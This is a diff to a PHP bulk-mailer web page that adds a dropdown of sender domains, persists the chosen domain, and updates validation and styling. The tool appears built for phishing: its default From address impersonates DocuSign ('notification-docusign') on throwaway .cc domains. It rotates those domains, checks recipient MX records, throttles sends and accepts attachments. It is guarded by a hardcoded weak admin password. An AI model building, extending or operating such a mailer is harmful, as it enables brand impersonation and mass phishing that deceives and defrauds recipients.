@@ -1,13 +1,13 @@
 <?php
 /**
- * Full-Page Dark Bulk Mailer with TinyMCE & DNS MX Validation
+ * Full-Page Dark Bulk Mailer with TinyMCE & Domain Selector
+ * Sender domain selectable from options + persisted after send → Back
  * Validates: From Username, Reply-To, Recipients format + DNS MX records
- * Persists: From Name, Username, Reply-To, Subject, Message body
  */
 
 session_start();
 
-// Force error display for debugging (remove in production)
+// Debugging (remove in production)
 ini_set('display_errors', 1);
 ini_set('display_startup_errors', 1);
 error_reporting(E_ALL);
@@ -15,8 +15,13 @@ error_reporting(E_ALL);
 // ────────────────────────────────────────────────
 // CONFIG
 // ────────────────────────────────────────────────
-$smtp_domain = 'treworgy-baldacci.cc';
-$smtp_domain = 'bellshah.cc';
+$available_domains = [
+    'treworgy-baldacci.cc',
+    'bellshah.cc',
+    // Add more domains here if needed, e.g.:
+    // 'example.com',
+    // 'anotherdomain.co.za',
+];
 
 $smtp = [
     'host'     => 'smtp.zeptomail.com',
@@ -28,24 +33,26 @@ $smtp = [
 ];
 
 $default_sender_username = 'notification-docusign';
-
 $preview_sample_email = 'test.user@example.com';
 
 $admin_password = "B0TH"; // ← CHANGE THIS!
 $delay_us = 150000;
 $max_attach_size = 10 * 1024 * 1024;
 
-// Restore saved data
+// Restore saved data (including selected domain)
 $saved = $_SESSION['saved_form'] ?? [];
-$sender_name_val     = htmlspecialchars($saved['sender_name'] ?? $smtp['from_name']);
+$sender_name_val     = htmlspecialchars($saved['sender_name']     ?? $smtp['from_name']);
 $sender_username_val = htmlspecialchars($saved['sender_username'] ?? $default_sender_username);
-$reply_to_val        = htmlspecialchars($saved['reply_to'] ?? '');
-$subject_val         = htmlspecialchars($saved['subject'] ?? '');
+$sender_domain_val   = in_array($saved['sender_domain'] ?? '', $available_domains) 
+                       ? $saved['sender_domain'] 
+                       : $available_domains[0]; // default to first domain
+$reply_to_val        = htmlspecialchars($saved['reply_to']        ?? '');
+$subject_val         = htmlspecialchars($saved['subject']         ?? '');
 $body_val            = $saved['body'] ?? '';
 unset($_SESSION['saved_form']);
 
-// Full sender email
-$sender_email = $sender_username_val . '@' . $smtp_domain;
+// Full sender email (username + selected domain)
+$sender_email = $sender_username_val . '@' . $sender_domain_val;
 
 // ────────────────────────────────────────────────
 // AUTH
@@ -92,9 +99,7 @@ function isDisposable($email) {
     return in_array($domain, $list);
 }
 
-// ────────────────────────────────────────────────
-// VALIDATION FUNCTIONS
-// ────────────────────────────────────────────────
+// Validation functions
 function isValidEmailUsername($username) {
     return preg_match('/^[a-zA-Z0-9.!#$%&\'*+\/=?^_`{|}~-]{1,64}$/', $username);
 }
@@ -140,11 +145,12 @@ if (isset($_POST['action']) && $_POST['action'] === 'preview') {
 // SENDING LOGIC + VALIDATION + SAVE FORM DATA
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] === 'send') {
     $sender_username = trim($_POST['sender_username'] ?? $default_sender_username);
-    $sender_name  = trim($_POST['sender_name'] ?? $smtp['from_name']);
-    $reply_to     = trim($_POST['reply_to'] ?? '');
-    $subject_raw  = trim($_POST['subject'] ?? '');
-    $body_raw     = $_POST['body'] ?? '';
-    $to_list      = trim($_POST['emails'] ?? '');
+    $sender_domain   = trim($_POST['sender_domain'] ?? $available_domains[0]);
+    $sender_name     = trim($_POST['sender_name'] ?? $smtp['from_name']);
+    $reply_to        = trim($_POST['reply_to'] ?? '');
+    $subject_raw     = trim($_POST['subject'] ?? '');
+    $body_raw        = $_POST['body'] ?? '';
+    $to_list         = trim($_POST['emails'] ?? '');
 
     // ─── SERVER-SIDE VALIDATION ───
     $errors = [];
@@ -154,12 +160,17 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['
         $errors[] = "Invalid From Email Username. Use 1–64 chars (letters, digits, dots, hyphens, underscores allowed).";
     }
 
+    // Sender Domain (must be one of the allowed ones)
+    if (!in_array($sender_domain, $available_domains)) {
+        $errors[] = "Invalid sender domain selected.";
+    }
+
     // Reply-To (if provided)
     if ($reply_to !== '' && !isValidEmail($reply_to)) {
         $errors[] = "Invalid Reply-To email address.";
     }
 
-    // Recipients – format + MX check
+    // Recipients – format + MX/A check
     $emails = array_filter(array_map('trim', explode("\n", $to_list)));
     if (empty($emails)) {
         $errors[] = "At least one recipient email is required.";
@@ -194,12 +205,13 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['
     $_SESSION['saved_form'] = [
         'sender_name'     => $sender_name,
         'sender_username' => $sender_username,
+        'sender_domain'   => $sender_domain,  // ← now saved too
         'reply_to'        => $reply_to,
         'subject'         => $subject_raw,
         'body'            => $body_raw,
     ];
 
-    $sender_email = $sender_username . '@' . $smtp_domain;
+    $sender_email = $sender_username . '@' . $sender_domain;
 
     $attachments = [];
     if (!empty($_FILES['attachments']['name'][0])) {
@@ -317,7 +329,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['
         .card-header { background:#1f6feb; color:white; padding:1rem; text-align:center; font-weight:600; border-radius:0; }
         .card-body { padding:1.5rem 1.5rem 3rem; }
         .form-label { font-size:0.9rem; margin-bottom:0.4rem; font-weight:600; }
-        .form-control-sm { font-size:0.9rem; padding:0.5rem 0.75rem; background:#0d1117; color:#c9d1d9; border:1px solid #30363d; }
+        .form-control-sm, .form-select-sm { font-size:0.9rem; padding:0.5rem 0.75rem; background:#0d1117; color:#c9d1d9; border:1px solid #30363d; }
         .btn { font-size:0.95rem; padding:0.5rem 1rem; }
         .form-text { font-size:0.8rem; color:#8b949e; }
         .tight-mb { margin-bottom:0.75rem !important; }
@@ -347,9 +359,15 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['
                         <label class="form-label">From Email Username</label>
                         <div class="input-group input-group-sm">
                             <input type="text" name="sender_username" id="sender_username" class="form-control form-control-sm" value="<?= $sender_username_val ?>" required placeholder="notification-docusign">
-                            <span class="input-group-text">@<?= htmlspecialchars($smtp_domain) ?></span>
+                            <select name="sender_domain" class="form-select form-select-sm" style="max-width:220px;">
+                                <?php foreach ($available_domains as $domain): ?>
+                                    <option value="<?= htmlspecialchars($domain) ?>" <?= $domain === $sender_domain_val ? 'selected' : '' ?>>
+                                        @<?= htmlspecialchars($domain) ?>
+                                    </option>
+                                <?php endforeach; ?>
+                            </select>
                         </div>
-                        <div class="form-text text-danger small">Username editable • Domain fixed & verified by Admin</div>
+                        <div class="form-text text-danger small">Username editable • Domain selectable & verified in ZeptoMail</div>
                         <div id="usernameError" class="error-message"></div>
                     </div>
 
@@ -509,7 +527,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['
                 .then(r => r.text())
                 .then(html => {
                     document.querySelector('#previewModal .modal-content').innerHTML = html;
-                    // Re-attach close button
                     const closeBtn = document.querySelector('#previewModal .btn-close');
                     if (closeBtn) {
                         closeBtn.onclick = () => {
